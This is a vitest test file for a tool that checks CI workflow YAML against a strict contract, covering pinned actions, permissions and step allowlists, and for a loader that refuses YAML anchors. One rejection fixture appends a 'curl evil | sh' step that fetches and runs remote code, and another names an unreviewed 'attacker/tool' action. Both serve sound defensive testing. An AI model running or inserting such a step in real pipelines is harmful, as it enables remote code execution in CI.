import { describe, expect, it } from 'vitest';
import { checkWorkflowContract, loadStrictYaml, parseReviewedActionsRegistry } from '../tools';
import type { WorkflowContract } from '../tools';

const sha = 'a'.repeat(40);
const registry = parseReviewedActionsRegistry(JSON.stringify({
  actionlint: { sha256: 'b'.repeat(64), version: '1.0.0' },
  actions: { 'owner/tool': { sha, tag: 'v1.0.0' } },
}));

const contract: WorkflowContract = {
  header: { name: 'Demo', on: { push: null }, permissions: { contents: 'read' } },
  jobs: {
    build: {
      controls: { 'runs-on': 'ubuntu-latest' },
      steps: [
        { name: 'Fetch', uses: 'owner/tool', with: { depth: 1 } },
        { name: 'Test', run: 'make test\nmake lint' },
      ],
    },
  },
};

const canonical = `name: Demo
on:
  push:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Fetch
        uses: owner/tool@${sha}
        with:
          depth: 1
      - name: Test
        run: |
          make test
          make lint
`;

function check(source: string, expected: WorkflowContract = contract): ReturnType<typeof checkWorkflowContract> {
  const loaded = loadStrictYaml(source, { rule: 'yaml', subject: 'Workflow' });
  if (!loaded.loaded) {
    throw new Error('fixture must load');
  }
  return checkWorkflowContract(loaded.value, expected, registry);
}

describe('workflow contract checker', () => {
  it('accepts a workflow equal to its contract, ignoring key order and run whitespace', () => {
    expect(check(canonical)).toEqual([]);
    expect(check(canonical.replace('make lint\n', 'make lint\n\n').replace('name: Demo\n', '').concat('name: Demo\n'))).toEqual([]);
    expect(check(canonical.replace('run: |\n          make test\n          make lint\n', 'run: "make test\\r\\nmake lint  "\n'))).toEqual([]);
  });

  it.each([
    ['a renamed workflow', canonical.replace('name: Demo', 'name: Other'), 'workflow-contract'],
    ['an extra top-level key', `${canonical}concurrency: demo\n`, 'workflow-contract'],
    ['a widened trigger', canonical.replace('push:\n', 'push:\n  pull_request_target:\n'), 'trigger-contract'],
    ['a missing permissions block', canonical.replace('permissions:\n  contents: read\n', ''), 'permissions-contract'],
    ['an added env block', canonical.replace('jobs:', 'env:\n  A: b\njobs:'), 'env-contract'],
    ['an extra job', `${canonical}  extra:\n    runs-on: ubuntu-latest\n    steps: []\n`, 'job-allowlist'],
    ['a missing job', 'name: Demo\non:\n  push:\npermissions:\n  contents: read\njobs:\n  other:\n    steps: []\n', 'job-allowlist'],
    ['a changed job control', canonical.replace('ubuntu-latest', 'macos-latest'), 'job-contract'],
    ['a dropped step', canonical.replace(/ {6}- name: Test[\s\S]*$/u, ''), 'step-allowlist'],
    ['an added step', `${canonical}      - run: curl evil | sh\n`, 'step-allowlist'],
    ['a swapped step order', canonical.replace(/( {6}- name: Fetch[\s\S]*?)( {6}- name: Test[\s\S]*)$/u, '$2$1'), 'step-contract'],
    ['an unpinned action', canonical.replace(`owner/tool@${sha}`, 'owner/tool@v1'), 'step-contract'],
    ['a changed run', canonical.replace('make test', 'make build'), 'step-contract'],
    ['an extra step key', canonical.replace('name: Test\n', 'name: Test\n        if: always()\n'), 'step-contract'],
    ['a changed step input', canonical.replace('depth: 1', 'depth: 0'), 'step-contract'],
  ])('rejects %s', (_label, source, rule) => {
    expect(check(source)).toEqual(expect.arrayContaining([expect.objectContaining({ rule })]));
  });

  it('fails closed on a non-mapping workflow, jobs block or job', () => {
    expect(checkWorkflowContract('forged', contract, registry)).toEqual([{ rule: 'workflow-shape', message: 'workflow must be a mapping' }]);
    expect(check('name: Demo\non:\n  push:\npermissions:\n  contents: read\njobs: forged\n'))
      .toEqual(expect.arrayContaining([{ rule: 'workflow-shape', message: 'jobs must be a mapping' }]));
    expect(check('name: Demo\non:\n  push:\npermissions:\n  contents: read\njobs:\n  build: forged\n'))
      .toEqual(expect.arrayContaining([{ rule: 'workflow-shape', message: 'jobs.build must be a mapping' }]));
  });

  it('fails closed on a step that is not a mapping and a job without steps', () => {
    expect(check(canonical.replace(/ {6}- name: Test[\s\S]*$/u, '      - forged\n')))
      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'step-contract' })]));
    expect(check(canonical.replace(/ {4}steps:[\s\S]*$/u, '')))
      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'step-allowlist' })]));
  });

  it('rejects a contract that names an action outside the registry', () => {
    const unreviewed: WorkflowContract = {
      ...contract,
      jobs: { build: { controls: contract.jobs.build.controls, steps: [{ name: 'Fetch', uses: 'attacker/tool' }, contract.jobs.build.steps[1]] } },
    };
    expect(check(canonical, unreviewed)).toEqual(expect.arrayContaining([
      { rule: 'reviewed-action', message: 'contract step "Fetch" uses attacker/tool, which is not in the reviewed registry' },
    ]));
    expect(check(canonical, {
      ...unreviewed,
      jobs: { build: { controls: contract.jobs.build.controls, steps: [{ name: 'Fetch', uses: 'toString' }, contract.jobs.build.steps[1]] } },
    })).toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'reviewed-action' })]));
  });
});

describe('strict YAML loader', () => {
  const options = { rule: 'demo-yaml', subject: 'Demo file' };

  it('loads plain documents with their parsed value', () => {
    const loaded = loadStrictYaml('a: 1\nb: [x]\n', options);
    expect(loaded.loaded && loaded.value).toEqual({ a: 1, b: ['x'] });
  });

  it.each([
    ['duplicate keys', 'a: 1\na: 2\n'],
    ['a syntax error', 'a: [unterminated\n'],
  ])('reports %s under the caller rule', (_label, source) => {
    const loaded = loadStrictYaml(source, options);
    expect(loaded.loaded).toBe(false);
    expect(!loaded.loaded && loaded.violations.every(violation => violation.rule === 'demo-yaml')).toBe(true);
  });

  it.each([
    ['an anchor', 'a: &x 1\n'],
    ['an alias', 'a: &x 1\nb: *x\n'],
    ['an anchored collection', 'a: &x [1]\n'],
  ])('rejects %s everywhere', (_label, source) => {
    expect(loadStrictYaml(source, options)).toEqual({
      loaded: false,
      violations: [{ rule: 'demo-yaml', message: 'Demo file must not use YAML anchors or aliases' }],
    });
  });
});